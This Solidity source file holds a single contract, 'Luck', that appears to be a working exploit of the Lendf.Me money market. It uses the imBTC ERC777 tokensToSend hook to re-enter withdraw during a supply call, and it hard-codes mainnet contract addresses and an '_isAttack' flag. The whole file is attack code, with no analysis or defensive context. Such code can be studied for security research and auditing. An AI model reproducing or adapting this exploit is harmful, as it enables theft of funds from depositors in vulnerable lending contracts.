pragma solidity ^0.8.4;

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 _interfaceHash,
        address implementer
    ) external;
}

interface IMoneyMarket {
    function withdraw(address asset, uint256 requestedAmount)
        external
        returns (uint256);

    function supply(address asset, uint256 amount) external returns (uint256);

    function getSupplyBalance(address account, address asset)
        external
        view
        returns (uint256);

    function borrow(address asset, uint256 amount) external returns (uint256);
}

interface IMBTC {
    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256);
}

contract Luck {
    bytes32 private constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
    address private constant _lendfMe =
        0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;
    address private constant _imBTC =
        0x3212b29E33587A00FB1C83346f5dBFA69A458923;

    address private _owner;

    IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor() payable {
        _owner = msg.sender;
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_SENDER_INTERFACE_HASH,
            address(this)
        );
        IMBTC(_imBTC).approve(
            _lendfMe,
            115792089237316195423570985008687907853269984665640564039457584007913129639935
        );
    }

    bool private _isAttack = false;

    function good_luck() external {
        require(msg.sender == _owner);
        uint256 _balance = IMBTC(_imBTC).balanceOf(address(this));
        IMoneyMarket(_lendfMe).supply(_imBTC, _balance);
        _isAttack = true;
        IMoneyMarket(_lendfMe).supply(_imBTC, 0);
        uint256 _requestedAmount = IMoneyMarket(_lendfMe).getSupplyBalance(
            address(this),
            _imBTC
        );
        IMoneyMarket(_lendfMe).withdraw(_imBTC, _requestedAmount);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (_isAttack) {
            _isAttack = false;
            uint256 _requestedAmount = IMoneyMarket(_lendfMe).getSupplyBalance(
                address(this),
                _imBTC
            );
            IMoneyMarket(_lendfMe).withdraw(_imBTC, _requestedAmount);
        }
    }
}
